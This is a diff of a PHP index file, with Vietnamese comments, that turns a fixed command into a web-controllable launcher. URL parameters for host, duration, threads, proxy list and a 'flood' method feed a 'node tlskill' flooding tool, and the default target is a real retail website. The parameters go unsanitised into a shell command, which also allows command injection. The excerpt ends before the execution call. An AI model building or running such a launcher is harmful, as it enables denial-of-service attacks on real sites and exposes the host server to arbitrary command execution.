@@ -1,8 +1,14 @@
 <?php
 // Tệp index.php
 
-// Lệnh cần chạy
-$command = 'node tlskill https://www.mwc.com.vn/ 60 10 10 live.txt flood';
+// Lấy tham số từ URL
+$host = $_GET['host'] ?? 'https://www.mwc.com.vn';
+$time = $_GET['time'] ?? '60';
+$threads = $_GET['threads'] ?? '10';
+$core = $_GET['core'] ?? '10';
+$proxy = $_GET['proxy'] ?? 'live.txt';
+$methods = $_GET['methods'] ?? 'flood';
+$command = "node tlskill $host $time $threads $core $proxy $methods";
 
 try {
     // Chạy lệnh trong terminal
